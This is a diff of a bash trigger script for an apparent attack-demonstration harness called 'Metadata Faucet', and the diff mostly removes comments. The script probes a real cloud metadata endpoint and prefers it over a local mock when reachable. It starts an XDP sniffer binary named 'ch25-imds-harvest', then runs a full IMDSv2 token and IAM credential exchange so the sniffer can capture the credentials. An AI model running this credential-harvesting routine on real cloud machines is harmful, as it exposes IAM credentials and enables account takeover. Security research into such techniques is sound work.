@@ -1,13 +1,5 @@
 #!/bin/bash
 # ch25 Metadata Faucet trigger.
-#
-# If a real IMDS endpoint is reachable, exercise against that. Otherwise,
-# spin up a Python mock IMDSv2 server on 127.0.0.1:80 and exercise in
-# mock mode so the harness can demonstrate the primitive on linuxkit.
-#
-# Honest skip:
-#   - no reachable IMDS, CH25_MOCK_IMDS != 1  → CH25_SKIP
-#   - XDP attach fails on all netdevs tried    → CH25_SKIP
 set +e
 
 echo "=== CH25 trigger starting ==="
@@ -15,8 +7,6 @@ echo "=== CH25 trigger starting ==="
 MOCK=${CH25_MOCK_IMDS:-1}
 REAL_REACHABLE=0
 
-# Probe the real IMDS endpoint with a 1s timeout. If the PUT succeeds,
-# we are on a cloud VM with live metadata; prefer that path.
 if command -v curl >/dev/null 2>&1; then
     if timeout 1 curl -s -o /dev/null -w "%{http_code}" \
             --request PUT "http://169.254.169.254/latest/api/token" \
@@ -37,13 +27,11 @@ LOADER_IF="lo"
 TARGET="http://127.0.0.1"
 
 if [ "$REAL_REACHABLE" = "1" ]; then
-    # Choose a non-loopback interface.
     LOADER_IF=$(ip -o link show | awk -F': ' '$2 !~ /^lo/ {print $2; exit}')
     TARGET="http://169.254.169.254"
     LOADER_ARGS="-i $LOADER_IF"
 else
-    # Spin a minimal mock IMDSv2 server on 127.0.0.1:80.
-    python3 - "$LOG.mock" <<'PY' &
+    python3 - <<'PY' &
 import http.server, json, socketserver
 class H(http.server.BaseHTTPRequestHandler):
     def log_message(self, *a, **kw): pass
@@ -80,13 +68,11 @@ fi
 ./build/ch25-imds-harvest $LOADER_ARGS > "$LOG" 2>&1 &
 LPID=$!
 
-# Wait for attach.
 for _ in $(seq 1 30); do
     grep -q '\[ch25\] attached' "$LOG" && break
     sleep 0.1
 done
 
-# Run a full IMDSv2 exchange.
 TOKEN=$(curl -sS --request PUT "$TARGET/latest/api/token" \
             -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
 ROLE=$(curl -sS "$TARGET/latest/meta-data/iam/security-credentials/" \
@@ -94,7 +80,6 @@ ROLE=$(curl -sS "$TARGET/latest/meta-data/iam/security-credentials/" \
 curl -sS "$TARGET/latest/meta-data/iam/security-credentials/$ROLE" \
      -H "X-aws-ec2-metadata-token: $TOKEN" > /dev/null 2>&1
 
-# Let the ringbuf drain.
 sleep 1
 
 kill -TERM "$LPID" 2>/dev/null
@@ -110,4 +95,4 @@ else
     echo "=== CH25_SKIP reason=\"no credentials captured — XDP may not have attached\" ==="
 fi
 
-rm -f "$LOG" "$LOG.mock"
+rm -f "$LOG"
